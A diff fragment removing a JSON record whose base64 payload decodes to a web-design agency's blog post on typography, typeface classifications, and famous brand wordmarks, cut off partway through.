@@ -1,1 +1,247 @@
-{"data":"LS0tCnRpdGxlOiAiVHlwb2dyYXBoeSBhbmQgVHlwZWZhY2VzIgpzbHVnOiAidHlwb2dyYXBoeS1hbmQtdHlwZWZhY2VzIgpkYXRlOiAiMjAyMy0xMS0xNiIKYXV0aG9yOiAiQ2FuYWRpYW4gV2ViIERlc2lnbnMiCmRlc2NyaXB0aW9uOiAiVHlwb2dyYXBoeSBhbmQgVHlwZWZhY2VzIgprZXl3b3JkczogWyJ0eXBvZ3JhcGh5IGFuZCB0eXBlZmFjZXMiLCJCbG9nIl0KY2F0ZWdvcnk6ICJCbG9nIgpmZWF0dXJlZEltYWdlOiAiaHR0cHM6Ly9vbGQuY2FuYWRpYW53ZWJkZXNpZ25zLmNhL3dwLWNvbnRlbnQvdXBsb2Fkcy8yMDIwLzA4L3BpbGUtb2Ytd29vZGVuLWxldHRlcnMtUERaMjVSRS1zY2FsZWQtMS5qcGciCi0tLQoKPHA+SGF2ZSB5b3UgZXZlciBub3RpY2VkIHRoZSB3b3JkbWFya3Mgb2Ygc29tZSBmYW1vdXMgYmlnIGNvbXBhbmllcz8gTGlrZSBDb2NhLUNvbGEsIEluc3RhZ3JhbSwgQ2FkYnVyeSwgZXRjLiwgc29tZSBhcmUgY3VydnksIGFuZCBzb21lIGFyZSBwbGFpbiBhbmQgYm9sZC4gVGhpcyBpcyBob3cgdGhleSByZXByZXNlbnQgdGhlaXIgYnJhbmQsIGNvbXBhbnksIGFuZCBwcm9kdWN0cy4gSW4gdGhpcyBibG9nLCB5b3Ugd2lsbCBsZWFybiBtb3JlIGFib3V0IHR5cG9ncmFwaHkgYW5kIGRpZmZlcmVudCB0eXBlZmFjZXMuPC9wPgoKPGgyIGNsYXNzPSJ3cC1ibG9jay1oZWFkaW5nIiBpZD0iaC13aGF0LWlzLXR5cG9ncmFwaHkiPjxzdHJvbmc+V2hhdCBpcyBUeXBvZ3JhcGh5Pzwvc3Ryb25nPjwvaDI+Cgo8cD5UeXBvZ3JhcGh5IGlzIGEgZ3JvdXAgb2YgZGVjb3JhdGl2ZSBkaWdpdGFsIGxldHRlcmluZ3MgdGhhdCBhcmUgYmVpbmcgYXJyYW5nZWQgYW5kIHN0eWxlZC4gVGhleeKAmXJlIG1vc3RseSBzZWVuIGluIGxvZ29zLCB3b3JkbWFya3MsIHdlYnNpdGVzLCBhIGNvdmVyIG9mIGUtYm9va3MsIGFsYnVtcywgYmFubmVycywgYWRzLCBhbmQgb3RoZXIgcHJvbW90aW9uYWwgbWF0ZXJpYWxzLiBNYW55IGdyYXBoaWMgZGVzaWduZXJzIGFuZCB3ZWIgZGV2ZWxvcGVycyB1c2Ugc29tZSB0ZWNobmlxdWVzIGluIG1ha2luZyBkaWdpdGFsIGxldHRlcmluZ3MgbG9vayBtb3JlIGFwcGVhbGluZywgY2xlYXIsIGFuZCByZWFkYWJsZSBpbiBhcHBlYXJhbmNlLjwvcD4KCjxoMiBjbGFzcz0id3AtYmxvY2staGVhZGluZyIgaWQ9ImgtYmVuZWZpdHMtb2YtdHlwb2dyYXBoeSI+PHN0cm9uZz5CZW5lZml0cyBvZiBUeXBvZ3JhcGh5PC9zdHJvbmc+PC9oMj4KCjxwPjxzdHJvbmc+VHlwb2dyYXBoeSBjYXB0dXJlcyB0aGUgYXR0ZW50aW9uIG9mIHVzZXJzPC9zdHJvbmc+ICAgICA8L3A+Cgo8cD5BZG1pdCBpdCwgd2hlbiB5b3Ugc2VlIGF0dHJhY3RpdmUgdHlwb2dyYXBoeSBvbiBhIGJvb2ssIHlvdSBwYXVzZSBmb3IgYSBtb21lbnQgdG8gc3RhcmUgYXQgdGhlIGZyb250IG9mIHRoZSBib29rIHRvIHNlZSBob3cgdGhlIGxldHRlcnMgYXJlIHN0eWxlZCBvbiBpdC4gVGhhdOKAmXMgYSBwb3dlciBvZiB0eXBvZ3JhcGh5LCBpdCBjYXB0dXJlcyB5b3VyIGF0dGVudGlvbiB0byBub3RpY2UgYW5kIGFwcHJlY2lhdGUgdGhlbS48L3A+Cgo8ZGl2IHN0eWxlPSJoZWlnaHQ6MzZweCIgYXJpYS1oaWRkZW49InRydWUiIGNsYXNzPSJ3cC1ibG9jay1zcGFjZXIiPjwvZGl2PgoKPHA+PHN0cm9uZz5UeXBvZ3JhcGh5IHJlcHJlc2VudHMgdGhlIGNvbXBhbnkgYW5kIGJyYW5kPC9zdHJvbmc+PC9wPgoKPHA+TW9zdCBiaWcgY29tcGFuaWVzIHVzZSB0eXBvZ3JhcGh5IGluIGRlc2lnbmluZyBicmFuZHMsIGxvZ29zLCBhbmQgd29yZG1hcmtzIGluIG9yZGVyIHRvIGJlIGVhc2lseSByZWNvZ25pemVkIGJ5IHRoZSBjb25zdW1lcnMuIEdvb2QgdHlwb2dyYXBoeSBvZnRlbiBib29zdHMgdGhlIGJyYW5kIHJlY29nbml0aW9uIG9mIHRoZSBjb21wYW55IGluIG9ubGluZSBhbmQgb2ZmbGluZSBtYXJrZXRzLiBDaG9vc2luZyB0aGUgcmlnaHQgdHlwZWZhY2VzIGFuZCBkZXNpZ25zIGNhbiByZXN1bHQgaW4gYSByZW1hcmthYmxlIGFuZCBpY29uaWMgcHJlc2VuY2UuPC9wPgoKPHA+PHN0cm9uZz5UeXBvZ3JhcGh5IGNvbW11bmljYXRlcyB5b3U8L3N0cm9uZz48L3A+Cgo8cD5BIGRpZ2l0YWwgcHJlc2VudGF0aW9uIG9mIHdvcmRzIGxpa2UgdHlwb2dyYXBoeSBjYW4gZGVsaXZlciBhIG1lc3NhZ2UgYW5kIHNlcnZlcyBhcyB2aXN1YWwgaW50ZXJhY3Rpb24gYmV0d2VlbiB0aGUgd3JpdGVyIGFuZCByZWFkZXJzLiBBY2NvcmRpbmcgdG8gYSBmYW1vdXMgYWR2ZXJ0aXNpbmcgYW5kIG1lZGlhIHBlcnNvbmFsaXR5LCBMYXVyYSBXb3J0aGluZ3RvbiBkZXNjcmliZWQgdHlwb2dyYXBoeSBhcyBhIHZpc3VhbCB2b2ljZSwgaXQgaW1wYXJ0cyBhIHZvaWNlIHdpdGhvdXQgcmVhZGluZyBpdC4gVGhlIHVuaXF1ZSBwZXJzb25hbGl0aWVzIGFuZCBlbW90aW9ucyBvZiBldmVyeSB0eXBlZmFjZSBhbmQgZm9udHMgY2FuIGltcGFjdCB0aGUgcGVyY2VwdGlvbiBvZiByZWFkZXJzLjwvcD4KCjxwPjxzdHJvbmc+VHlwb2dyYXBoeSBjYW4gYmUgdHJpY2t5PC9zdHJvbmc+PC9wPgoKPHA+RWZmZWN0aXZlIGlubm92YXRpb24gb2YgdHlwb2dyYXBoeSBjYW4gbWFuaXB1bGF0ZSBmZWVsaW5ncyBvZiBleGNpdGVtZW50IGFuZCBvdGhlciByZWFjdGlvbnMgZnJvbSByZWFkZXJzLiBJdCBjYW4gYWxzbyBhdHRyYWN0IGFuZCBpbmZsdWVuY2UgdGhlIHB1cmNoYXNpbmcgZGVjaXNpb25zIG9mIGNvbnN1bWVycy48L3A+Cgo8cD48c3Ryb25nPkNvbXBvc2l0aW9uYWwgRWxlbWVudHMgb2YgVHlwb2dyYXBoeTwvc3Ryb25nPjwvcD4KCjxwPkNob29zaW5nIHlvdXIgc3R5bGUgb24gdHlwb2dyYXBoeSBjYW4gYmUgY2hhbGxlbmdpbmcuIEhlcmUgYXJlIHNvbWUgZXNzZW50aWFsIGVsZW1lbnRzIHlvdSBuZWVkIHRvIGtub3cgdG8gaW1wcm92ZSB0aGUgY3JlYXRpb24gb2YgeW91ciB0eXBvZ3JhcGh5OjwvcD4KCjxwPjxzdHJvbmc+Q29sb3I8L3N0cm9uZz48L3A+Cgo8cD5Db2xvciBpcyB0aGUgbW9zdCBjb21tb24gZWxlbWVudCBpbiBhbGwgZm9ybXMgb2YgYXJ0LiBUaGUgbWFpbiBhc3BlY3Qgb2YgY29sb3IgaXMgdG8gbWFrZSBsZXR0ZXJzIHRvIGJlY29tZSBtb3JlIGFsaXZlIGFuZCBleWUtY2F0Y2hpbmcgZm9yIGFsbCByZWFkZXJzLiBDaG9vc2luZyB0aGUgcmlnaHQgY29sb3IgaW4geW91ciBjcmVhdGlvbiBvZiB0eXBvZ3JhcGh5IGlzIHZlcnkgaW1wb3J0YW50LiBBcHBseWluZyBhbiBhcHByb3ByaWF0ZSBjb21iaW5hdGlvbiBvZiBjb2xvcnMgY2FuIHJlZmxlY3QgdGhlIHByb2Zlc3Npb25hbGlzbSBhbmQgYXR0cmFjdGl2ZW5lc3Mgb2YgdGhlIGNvbmNlcHQuPC9wPgoKPHA+PHN0cm9uZz5UeXBlZmFjZSBhbmQgZm9udHM8L3N0cm9uZz48L3A+Cgo8cD5NYW55IHBlb3BsZSBhcmUgYmVpbmcgY29uZnVzZWQgYWJvdXQgdGhlIGRpZmZlcmVuY2UgYmV0d2VlbiB0eXBlZmFjZSBhbmQgZm9udHMuIEEgdHlwZWZhY2UgaXMgYSBzZXQgb2YgZGVzaWduZWQgY2hhcmFjdGVycyBhbmQgb3RoZXIgZWxlbWVudHMgaW5jbHVkaW5nIGZvbnQgc2l6ZSwgd2VpZ2h0LCBzaGFwZSwgYW5kIHNwYWNpbmcuIFdoaWxlIG9uIHRoZSBvdGhlciBoYW5kLCBhIGNvbWJpbmF0aW9uIG9mIHR5cGVmYWNlcyBzdWNoIGFzIHNpemUsIHdlaWdodCwgYW5kIHNwYWNpbmdzIGFyZSBjYWxsZWQgZm9udHMuIFRoZSBzZWxlY3Rpb24gb2YgdGhlIHJpZ2h0IHR5cGVmYWNlIGFuZCBhcHBsaWNhdGlvbiBvZiBmb250cyBpcyBpbXBvcnRhbnQgdG8gZ3JhcGhpYyBkZXNpZ25lcnMgZm9yIGEgY2xlYXIgYW5kIHJlYWRhYmxlIHByZXNlbnRhdGlvbiBvZiB0ZXh0cyBvciBwaHJhc2VzIGluIHR5cG9ncmFwaHkuPC9wPgoKPHA+PHN0cm9uZz5BbGlnbm1lbnQ8L3N0cm9uZz48L3A+Cgo8cD5BbGlnbm1lbnQgaXMgc2ltcGx5IGRlZmluZWQgYXMgdGhlIHBsYWNlbWVudCBvZiB3b3JkcyBvciBwaHJhc2VzIGluIHR5cG9ncmFwaHkuIE1vc3QgZ3JhcGhpYyBkZXNpZ25lcnMgcHJlZmVyIHRvIHVzZSBqdXN0aWZpZWQgb3IgY2VudGVyZWQgYWxpZ25tZW50IHRvIGxvb2sgbW9yZSBwcmVzZW50YWJsZSBpbiB0ZXJtcyBvZiBjcmVhdGluZyB3b3JkbWFya3Mgb3IgbG9nb3MuPC9wPgoKPHA+PHN0cm9uZz5XaGl0ZXNwYWNlPC9zdHJvbmc+PC9wPgoKPHA+VGhlIHdoaXRlc3BhY2UgKGFsc28ga25vd24gYXMgbmVnYXRpdmUgc3BhY2UpIGlzIGEgc3BhY2UgYmV0d2VlbiB0aGUgY29tcG9zaXRpb25hbCBlbGVtZW50cyBzdWNoIGFzIGxldHRlcnMsIG51bWJlcnMsIGFuZCBzeW1ib2xzLiBBcHBseWluZyB3aGl0ZXNwYWNlIGluIHlvdXIgdHlwb2dyYXBoeSBpcyBpbXBvcnRhbnQgZm9yIGJhbGFuY2luZyBhbmQgb3JnYW5pemluZyBiZXR3ZWVuIHRoZSB0ZXh0LCBkZXNpZ25zLCBhbmQgc3BhY2VzLjwvcD4KCjxwPjxzdHJvbmc+SGllcmFyY2h5PC9zdHJvbmc+PC9wPgoKPHA+UHJvcGVyIG9yZ2FuaXppbmcgb2Ygd29yZHMgb3IgcGhyYXNlcyBmb3IgY2xlYXIgYW5kIHJlYWRhYmxlIHZpc3VhbCBwcmVzZW50YXRpb24gaXMgdmVyeSBpbXBvcnRhbnQgZm9yIGdyYXBoaWMgZGVzaWduZXJzLiBTZWVpbmcgbWVzc3kgYW5kIHVub3JnYW5pemVkIHR5cG9ncmFwaHkgdHlwaWNhbGx5IGNhdXNlIGRpc2NvbWZvcnQgdG8gdGhlIHJlYWRlcnMuPGJyPjwvcD4KCjxoMiBjbGFzcz0id3AtYmxvY2staGVhZGluZyIgaWQ9ImgtZGlmZmVyZW50LWNsYXNzaWZpY2F0aW9uLW9mLXR5cGVmYWNlLWluLXR5cG9ncmFwaHkiPjxzdHJvbmc+RGlmZmVyZW50IENsYXNzaWZpY2F0aW9uIG9mIFR5cGVmYWNlIGluIFR5cG9ncmFwaHk8L3N0cm9uZz48L2gyPgoKPHA+PHN0cm9uZz5TZXJpZiBUeXBlZmFjZTwvc3Ryb25nPjwvcD4KCjxmaWd1cmUgY2xhc3M9IndwLWJsb2NrLWdhbGxlcnkgaGFzLW5lc3RlZC1pbWFnZXMgY29sdW1ucy1kZWZhdWx0IGlzLWNyb3BwZWQiPjwvZmlndXJlPgoKPHA+PHN0cm9uZz5PdGhlciBjYXRlZ29yaWVzIG9mIFNlcmlmIHR5cGVmYWNlOjxicj48L3N0cm9uZz48L3A+Cgo8dWwgY2xhc3M9IndwLWJsb2NrLWxpc3QiPgo8bGk+T2xkIFN0eWxlPC9saT4KCjxsaT5UcmFuc2l0aW9uYWw8L2xpPgoKPGxpPk5lb2NsYXNzaWNhbDwvbGk+Cgo8bGk+RGlkb25lPC9saT4KCjxsaT5Nb2Rlcm48L2xpPgoKPGxpPlNsYWI8L2xpPgoKPGxpPkNsYXJlbmRvbjwvbGk+Cgo8bGk+R2x5cGhpYzxicj48L2xpPgo8L3VsPgoKPHA+PHN0cm9uZz5TYW4gU2VyaWYgVHlwZWZhY2U8L3N0cm9uZz48L3A+Cgo8ZmlndXJlIGNsYXNzPSJ3cC1ibG9jay1pbWFnZSI+PGltZyBzcmM9Imh0dHBzOi8vbGg2Lmdvb2dsZXVzZXJjb250ZW50LmNvbS94NnpYdVVnSy1UN3dGZ2ZLd1ZpdzNFNzkwcjNWNE43U1F2TVEzaEtvREwyN3JYUEJhU24yb2hySUdNYlFsZFFrTDZJVjc0UDNoU0RzUklOMnRTUWNNc1lGdFFIUW5DNXpOZVZSUWt5cjJBaEY5MnpHTV9EOU00Nnp6czZxZTF4TWJ3UFo3a3RRIiBhbHQ9IlNhbiBTZXJpZiBUeXBlZmFjZSIvPjwvZmlndXJlPgoKPHA+VW5saWtlIFNlcmlmLCBTYW4gU2VyaWYgZG9lcyBub3QgaGF2ZSBhbiBlbWJlbGxpc2htZW50IGF0IHRoZSBlbmQgb2YgYSBsYXJnZXIgc3Ryb2tlIGluIGNoYXJhY3RlcnMuIENsZWFuLCBwbGFpbiwgYW5kIHJvdW5kZWQgc3Ryb2tlcyBvZiBTYW5zIFNlcmlmIGZvbnRzIHN5bWJvbGl6ZSBtb2Rlcm4gZW1vdGlvbnMgYW5kIHNpbXBsaWNpdHkuIFRoaXMgZm9udHPigJkgaW5mb3JtYWwgYXBwZWFyYW5jZSBjcmVhdGVzIG1vcmUgYXBwcm9hY2hhYmxlLCBmcmllbmRseSwgYW5kIHlvdXRoZnVsIGxvb2tzLjwvcD4KCjxwPjxzdHJvbmc+T3RoZXIgY2F0ZWdvcmllcyBvZiBTYW4gU2VyaWYgdHlwZWZhY2U6PGJyPjwvc3Ryb25nPjwvcD4KCjx1bCBjbGFzcz0id3AtYmxvY2stbGlzdCI+CjxsaT5Hcm90ZXNxdWU8L2xpPgoKPGxpPlNxdWFyZTwvbGk+Cgo8bGk+SHVtYW5pc3RpYzwvbGk+Cgo8bGk+R2VvbWV0cmljPGJyPjwvbGk+CjwvdWw+Cgo8cD48c3Ryb25nPlNjcmlwdCBUeXBlZmFjZTwvc3Ryb25nPjwvcD4KCjxmaWd1cmUgY2xhc3M9IndwLWJsb2NrLWltYWdlIGlzLXJlc2l6ZWQiPjxpbWcgc3JjPSJodHRwczovL2xoNC5nb29nbGV1c2VyY29udGVudC5jb20vTEF0b3puTDZaRXJfU0J4azA1Q1NCaHRyOV9BYThSZ0g5UFNMOUQxaEIyOGpZSDJxN2pHQUJDRTcyMnJhenBSMG9saXotR3hGSnFTSFZDZmdLUlNlQ2lSUGdQTEFZN2R5RTIzamNUUkg1Y2U5QjVILWpGaWhqVll3S3hRd1ZTX0JYWUtyNkpyZiIgYWx0PSJTY3JpcHQgVHlwZWZhY2UiIHN0eWxlPSJhc3BlY3QtcmF0aW86MTt3aWR0aDo4NDBweDtoZWlnaHQ6YXV0byIvPjwvZmlndXJlPgoKPHA+U2NyaXB0IHR5cGVmYWNlcyBsb29rIGxpa2UgZGlnaXRhbCBjYWxsaWdyYXBoeSB3aXRoIHRoZSBmZWF0dXJlcyBvZiBjdXJzaXZlIGFuZCBzdHlsaXplZCBoYW5kd3JpdHRlbiBmbHVpZCBzdHJva2VzLiBUaGUgY2FzdWFsIGxvb2tpbmcgdHlwZWZhY2Ugc2hvd3MgY3JlYXRpdml0eSBhbmQgY2xldmVybmVzcy4gQSBTY3JpcHQgdHlwZWZhY2UgaXMgb2Z0ZW4gdXNlZCBmb3IgZGlzcGxheSBwdXJwb3NlcyBzcGVjaWZpY2FsbHkgaW4gaGVhZGluZ3MgYW5kIG5vdCBhcHBsaWNhYmxlIGluIGJvZHkgdGV4dC48L3A+Cgo8cD48c3Ryb25nPk90aGVyIGNhdGVnb3JpZXMgb2YgU2NyaXB0IHR5cGVmYWNlOjxicj48L3N0cm9uZz48L3A+Cgo8dWwgY2xhc3M9IndwLWJsb2NrLWxpc3QiPgo8bGk+Rm9ybWFsPC9saT4KCjxsaT5DYXN1YWw8L2xpPgoKPGxpPkNhbGxpZ3JhcGhpYzwvbGk+Cgo8bGk+SGFuZHdyaXRpbmc8L2xpPgoKPGxpPkJsYWNrbGV0dGVyPC9saT4KCjxsaT5Mb21iYXJkaTwvbGk+CjwvdWw+Cgo8cD48c3Ryb25nPkRpc3BsYXkgVHlwZWZhY2U8L3N0cm9uZz48L3A+Cgo8ZmlndXJlPjxpbWcgc3JjPSJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vMFVVU2x3c2laMVFVWmFVY0s3VzhFUXFRbGZoUHR5SUNPVm5uZjN3TTdsdEExNXRkOUtfZ1JOS0J0TWdaMy1vTm9kaDFoeHV3RjZKNkhocWx1MS1sOVJyWmtwV2pUbk1DbF8yV2RodjdrQkcxREMxOGs4N3VsX0hfQ2hmZlFEd2cwdU5aMlBlYiIgYWx0PSJEaXNwbGF5IFR5cGVmYWNlIi8+PC9maWd1cmU+Cgo8cD5Db21iaW5lZCBkZWNvcmF0aXZlIGNvbG9yIGFuZCBzdHlsaXplZCBmb250cyBhcmUgY2FsbGVkIERpc3BsYXkgdHlwZWZhY2UuIFRoaXMgdHlwZWZhY2UgdXN1YWxseSBjb250YWlucyBjdXN0b21pemVkIHNpemVzIGFuZCB0aGlja25lc3Nlcy4gTW9zdCBEaXNwbGF5IHR5cGVmYWNlcyBhcmUgY29tbW9ubHkgc2VlbiBvbiB0aGUgY292ZXJzIG9mIGJvb2tzLCBlLWJvb2tzLCBjb21tZXJjaWFsIHNpZ25hZ2VzLCBiaWxsYm9hcmRzLCBwcm9tb3Rpb25hbCBtYXRlcmlhbHMsIGV0Yy48L3A+Cgo8cD48c3Ryb25nPk90aGVyIGNhdGVnb3JpZXMgb2YgRGlzcGxheSB0eXBlZmFjZTo8YnI+PC9zdHJvbmc+PC9wPgoKPHVsIGNsYXNzPSJ3cC1ibG9jay1saXN0Ij4KPGxpPkdydW5nZTwvbGk+Cgo8bGk+UHN5Y2hlZGVsaWM8L2xpPgoKPGxpPkdyYWZmaXRpPGJyPjwvbGk+CjwvdWw+Cgo8cD48c3Ryb25nPkZyaWVuZGx5IFRpcHM6PC9zdHJvbmc+PC9wPgoKPHA+PHN0cm9uZz5IZXJlIGFyZSBzb21lIHVzZWZ1bCB0aXBzIGZvciBjcmVhdGluZyB5b3VyIHR5cG9ncmFwaHk6PC9zdHJvbmc+PC9wPgoKPG9sIGNsYXNzPSJ3cC1ibG9jay1saXN0Ij4KPGxpPlN0YXJ0IGZyb20gc2tldGNoaW5nIGxldHRlcnMgb24geW91ciBzY3JhdGNoIHBhcGVyLjwvbGk+Cgo8bGk+RGV0ZXJtaW5lIGV2ZXJ5IGZvbnRzIGFuZCB0eXBlZmFjZSB0aGF0IGFyZSBzdWl0YWJsZSB0byB5b3VyIGNvbmNlcHQ8L2xpPgoKPGxpPkF2b2lkIHVzaW5nIHRoaW4gZm9udHMsIHRoZXkgY2FuIGJlIGRpZmZpY3VsdCB0byByZWFkLjwvbGk+Cgo8bGk+Rm9yIGhlYWRpbmdzLCB1c2Ugb25seSBhIGZldyB3b3JkcyBvciBzaG9ydCBwaHJhc2VzLjwvbGk+Cgo8bGk+VXNlIG90aGVyIGNob2ljZXMgb2YgdHlwZWZhY2UgKFNlcmlmcyBvciBTYW4gU2VyaWZzKSBmb3Igc3ViaGVhZGluZ3MuPC9saT4KCjxsaT5Pcmdhbml6ZSB0aGUgaWRlYXMgYmFzZWQgb24geW91ciBjb25jZXB0cyBhcHByb3ByaWF0ZWx5LjwvbGk+Cgo8bGk+UGF5IGF0dGVudGlvbiB0byB5b3VyIHNwYWNpbmdzLCBhbmQgYWxpZ25tZW50cy48L2xpPgoKPGxpPkFwcGx5IGFuIGF0dHJhY3RpdmUgY29tYmluYXRpb24gb2YgY29udHJhc3RpbmcgY29sb3JzLjwvbGk+Cgo8bGk+UmV2aXNlIHlvdXIgdHlwb2dyYXBoeSBpZiBuZWNlc3NhcnksIHRvIGxvb2sgbW9yZSBhcHBlYWxpbmcuPC9saT4KCjxsaT5GaW5kIHlvdXIgaW5zcGlyYXRpb25hbCB0eXBvZ3JhcGhpYyBkZXNpZ25zLjwvbGk+Cjwvb2w+Cgo8aDIgY2xhc3M9IndwLWJsb2NrLWhlYWRpbmciIGlkPSJoLWluc3BpcmF0aW9uYWwtdHlwb2dyYXBoaWMtZGVzaWducyI+PHN0cm9uZz5JbnNwaXJhdGlvbmFsIHR5cG9ncmFwaGljIGRlc2lnbnM8L3N0cm9uZz48L2gyPgoKPHA+SWYgeW91IGFyZSBicmFpbnN0b3JtaW5nIGFib3V0IGNyZWF0aW5nIGEgY29uY2VwdCwgd2UgZmVhdHVyZSBzb21lIGZhbW91cyB3b3JkbWFya3MgdGhhdCBiZWNhbWUgaWNvbmljIGFuZCByZW1hcmthYmxlIGJyYW5kcyBpbiBhbGwgY291bnRyaWVzLiBIZXJlIGFyZSB0aGUgaW5zcGlyYXRpb25hbCB3b3JkbWFya3MgZnJvbSB3ZWxsLWtub3duIGNvbXBhbmllcyBmb3IgaWRlYWwgdHlwb2dyYXBoeTo8L3A+Cgo8cD48c3Ryb25nPjEuIEluc3RhZ3JhbTwvc3Ryb25nPjwvcD4KCjxmaWd1cmU+PGltZyBzcmM9Imh0dHBzOi8vbGg2Lmdvb2dsZXVzZXJjb250ZW50LmNvbS8ycUprTlNyWkQySFFicXh2bE95enl4WkwyeElUTUVjSi04QkVwaVdsTnhnN2lkQ0JadDEtdmJ6b1lYREdBMVIwTVNZQW56QmlUREVJZEh3MnRhcm92RDhMcWdMMzBZQmgzbEYxUTN4eFROWk9GV3lCWFprUlJxenIyQ1hNMlVHNjItdVQ4SjhtIiBhbHQ9Ikluc3RhZ3JhbSIvPjwvZmlndXJlPgoKPHA+QSBwaG90by1zaGFyaW5nIHNvY2lhbCBtZWRpYSBhcHAgZmVhdHVyZXMgYSBsb2dvIHRoYXQgbG9va3MgbGlrZSBhIGhhbmR3cml0dGVuIHNjcmlwdC4gVGhlIGZvbnQgdGhleSB1c2VkIGlzIGRlc2lnbmVkIGJ5IFJ1c3NlbGwgQmVhbiBjYWxsZWQgQmlsbGFib25nLjwvcD4KCjxwPjxzdHJvbmc+Mi4gTWFpbENoaW1wPC9zdHJvbmc+PC9wPgoKPGZpZ3VyZT48aW1nIHNyYz0iaHR0cHM6Ly9saDMuZ29vZ2xldXNlcmNvbnRlbnQuY29tL19EZFdzWGUzVlBRd0tkVVBMTzFsV083dG1CSVBWSXBuV0pTV3ZnTEt1bndyRHhpVmVtOXl1cU5EYi1hRV91QzlOaFZwcktuM0ZzcTNfT1Uzd1BkaV9XZl9ld2dLLTBpNGxlZHRGbXVOUUlWRU5DWkRLY283eklOdXZqejdpZTBfR3JGbXlhTG8iIGFsdD0iTWFpbENoaW1wIi8+PC9maWd1cmU+Cgo8cD5NYWlsY2hpbXAgaXMgYSBwb3B1bGFyIG1hcmtldGluZyBwbGF0Zm9ybSB0eXBpY2FsbHkgZm9yIGVtYWlsIG1hcmtldGluZyBhbmQgb3RoZXIgZGVsaXZlcnkgc3lzdGVtcyB0aGF0IGFyZSBvZnRlbiB1c2VkIGJ5IG1hbnkgZW50cmVwcmVuZXVycyBhbmQgZGlnaXRhbCBtYXJrZXRlcnMuIFRoZWlyIGJyYW5kIHR5cGVmYWNlIHVzZWQgaXMgY2FsbGVkIENvb3BlciBMaWdodCBzaG93aW5nIGZyaWVuZGxpbmVzcyB0byB1c2Vycy48L3A+Cgo8cD48c3Ryb25nPjMuIENvY2EtQ29sYTwvc3Ryb25nPjwvcD4KCjxmaWd1cmU+PGltZyBzcmM9Imh0dHBzOi8vbGg0Lmdvb2dsZXVzZXJjb250ZW50LmNvbS9PYlg1OEw3VWtJRlBidUNjQ1kzUFlnZG5hdkdiVU9ZUWdzUDR1WHpXNERtV05DZzR6dEJrZTktZmxhWnRIa2lzTVZmTnlvUzlBa25XYUlUZ3B1NjdwcXRvbVpkSjFYekMwa3pram9nTHBWVTNVTUVBUFRUYjV5SXdFLXpaSWJ2c3FGSE9iRG5TIiBhbHQ9IkNvY2EtQ29sYSIvPjwvZmlndXJlPgoKPHA+PHN0cm9uZz48L3N0cm9uZz5BIGZhbW91cyBiZXZlcmFnZSBjb21wYW55IHdvcmxkd2lkZSB3aXRoIGFuIGV5ZS1jYXRjaGluZyBsb2dvIGFuZCBmaWxsZWQgd2l0aCByZWQgY29sb3Igb24gaXQuIEluIHRoZSB5ZWFyIDE4ODUsIHRoZSBsb2dvIG9mIHRoZSBDb2NhLUNvbGEgY29tcGFueSB3YXMgZGVzaWduZWQgYnkgRnJhbmsgTWFzb24gUm9iaW5zb24sIGFuZCB0aGUgdHlwZWZhY2UgdXNlZCBmb3IgYSB3b3JkbWFyayBjYWxsZWQgU3BlbmNlcmlhbiBzY3JpcHQuPC9wPgoKPHA+PHN0cm9uZz40LiBDYWRidXJ5PC9zdHJvbmc+PC9wPgoKPGZpZ3VyZT48aW1nIHNyYz0iaHR0cHM6Ly9saDMuZ29vZ2xldXNlcmNvbnRlbnQuY29tL3pNYllUcDIwUWg0b2hfVVRCd1J6RVdZUmhwcFVJZUM3LWt4RnpabHZvbTdoRkJLdVNyQVg4SjZpbHVsNjRMTVJTanRvVFgwa0ZoLVVGYnRob192WTVseHhYODgxSElIT0tzOWctWmxJbFZ4bEg5Vlg1OFk3MkJQckFJVDJ6VGdaYnlESUdxOXEiIGFsdD0iQ2FkYnVyeSIvPjwvZmlndXJlPgoKPHA+VGhpcyBjb25mZWN0aW9uZXJ5IGNvbXBhbnkgaGFzIGEgZmFzaGlvbmFibGUgYW5kIHdlbGwtZGVzaWduZWQgd29yZG1hcmsgbWFraW5nIGl0IG1vcmUgcmVjb2duaXphYmxlIHRvIGNvbnN1bWVycy4gSXQgaXMgd3JpdHRlbiBpbiBTZXJpZiBmb250IGFuZCBkZXNpZ25lZCBieSBHZW9yZ2VzIEF1cmlvbC48L3A+Cgo8cD48c3Ryb25nPjUuIFRoZSBOZXcgWW9yayBUaW1lczwvc3Ryb25nPjwvcD4KCjxmaWd1cmU+PGltZyBzcmM9Imh0dHBzOi8vbGg2Lmdvb2dsZXVzZXJjb250ZW50LmNvbS9QU0ttOUFaUUtyUW93djk0akx4eHZXZ211N25BSXlsWURvN0EwVThCMldaWW0tLTZUM0ZpRFFjTDUtb0hJQkVmMENJQlkzN2xjdzRpYUhsNlVkYng4VkdXSW5OVE50MmtWdWxsN3NrTWFzT25GSTNCazBVdkRJUkFOWEZZUzB1RlIxREhKVi01IiBhbHQ9IlRoZSBOZXcgWW9yayBUaW1lcyIvPjwvZmlndXJlPgoKPHA+VGhlIEFtZXJpY2FuIG5ld3NwYXBlciBwdWJsaXNoaW5nIGNvbXBhbnkgd2l0aCBodWdlIGluZmx1ZW5jZSBhbmQgbGVhZGVyc2hpcCB3b3JsZHdpZGUuIFRoZSBsYXRlc3Qgd29yZG1hcmsgd2l0aCBhIGJsYWNrIGFuZCB3aGl0ZSBjbGFzc2ljYWwgZGVzaWduIHdhcyBwcm9kdWNlZCBieSBFZHdhcmQgQmVuZ3VpYXQuIFRoaXMgd29yZG1hcmvigJlzIHN0eWxlIGlzIHNpbWlsYXIgdG8gdGhlIEJsYWNrbGV0dGVyIHR5cGVmYWNlLCB0aGUgZmlyc3QgaW52ZW50ZWQgZm9udCBpbiBoaXN0b3J5LjwvcD4KCjxwPjxzdHJvbmc+Ni4gR29vZ2xlPC9zdHJvbmc+PC9wPgoKPGZpZ3VyZT48aW1nIHNyYz0iaHR0cHM6Ly9saDMuZ29vZ2xldXNlcmNvbnRlbnQuY29tL0owOGtiekxSMFU3SHRjY1pHQTVKQVVIR19hY1F5bWhUcjdaQmxJaUh1cG9mTDhNSDE1Z1JNSkplZmdIdlFJUVUtcTJkNnlNTGJYSzJyYTVWeTktNE1LMGdDU3ktZzdDTDN1cjcweEhiWjBuZ3JEM0F3U0xzRFo3TkJFYWo3aUJ5SGdkMGNuN2siIGFsdD0iR29vZ2xlIi8+PC9maWd1cmU+Cgo8cD5UaGUgbW9zdCBwb3B1bGFyIHNlYXJjaCBlbmdpbmVzIHdpdGggbWlsbGlvbnMgb2YgdXNlcnMgcHVibGlzaGVkIHRoZSBsYXRlc3Qgd29yZG1hcmsgbGFzdCBTZXB0ZW1i